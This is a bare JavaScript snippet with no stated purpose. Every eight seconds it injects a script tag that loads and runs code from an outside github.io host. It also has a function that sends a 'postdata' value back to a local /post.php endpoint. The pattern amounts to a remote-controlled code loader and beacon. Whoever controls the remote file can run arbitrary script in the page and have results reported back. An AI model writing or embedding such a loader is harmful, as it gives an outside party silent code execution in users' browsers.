var postdata = "default_postback";
function main() {


var script = document.createElement("script");
script.src = "https://gydo194.github.io/event.txt";
script.type = "application/javascript";
document.head.appendChild( script );

};

function postback() {
	var posturl = "/post.php?postback=" + postdata;
	console.log(posturl);
	var xmlHTTP = new XMLHttpRequest();
	xmlHTTP.open("GET", posturl, false);
	xmlHTTP.send();
	return 0;
};



setInterval(function(){main()}, 8000)
